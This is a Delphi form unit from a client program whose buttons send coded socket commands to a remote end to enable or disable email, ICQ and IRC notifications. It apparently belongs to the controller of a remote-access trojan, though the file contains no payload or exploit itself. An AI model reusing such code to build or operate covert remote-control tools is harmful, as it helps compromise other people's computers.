unit EmailUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls;

type
  TEmailForm = class(TForm)
    Edit1: TEdit;
    Label1: TLabel;
    Label2: TLabel;
    Edit2: TEdit;
    Label3: TLabel;
    Edit3: TEdit;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    procedure Button3Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure FormHide(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  EmailForm: TEmailForm;

implementation

uses Unit2;

{$R *.DFM}

procedure TEmailForm.Button3Click(Sender: TObject);
begin
 hide;
end;

procedure TEmailForm.Button2Click(Sender: TObject);
begin
case tag of
 1:begin Form1.Status.Caption:='disableing email notification...';Form1.ClientSocket.Socket.SendText('DEM');end;
 2:begin Form1.Status.Caption:='disableing ICQ notification...';Form1.ClientSocket.Socket.SendText('DIN');end;
 3:begin Form1.Status.Caption:='disableing IRC notification...';Form1.ClientSocket.Socket.SendText('DIC');end;
end;
 hide;
end;

procedure TEmailForm.Button1Click(Sender: TObject);
var len,sendit:string;
begin
 sendit:='';
 if length(edit1.text)<10 then sendit:=sendit+'0'+inttostr(length(edit1.text))
                          else sendit:=sendit+inttostr(length(edit1.text));
 if length(edit2.text)<10 then sendit:=sendit+'0'+inttostr(length(edit2.text))
                          else sendit:=sendit+inttostr(length(edit2.text));
 if length(edit3.text)<10 then sendit:=sendit+'0'+inttostr(length(edit3.text))
                          else sendit:=sendit+inttostr(length(edit3.text));

if tag=1 then begin
 Form1.Status.Caption:='trying to enable email notification...';
 Form1.ClientSocket.Socket.SendText('EEM'+sendit+edit1.text+edit2.text+edit3.text);
end;
if tag=2 then begin
 if length(Edit2.Text)<10 then len:='0' else len:='';
 len:=len+inttostr(length(Edit2.Text));
 Form1.Status.Caption:='trying to enable ICQ notification...';
 Form1.ClientSocket.Socket.SendText('EIN'+len+Edit2.Text+Edit1.text);
end;
if tag=3 then begin
 Form1.Status.Caption:='trying to enable IRC notification...';
 Form1.ClientSocket.Socket.SendText('EIC'+sendit+edit1.text+edit2.text+edit3.text);
end;
 hide;
end;

procedure TEmailForm.FormHide(Sender: TObject);
begin
if tag=2 then
 Form1.SaveINI('Options','MyUIN',Edit1.Text);
end;

end.
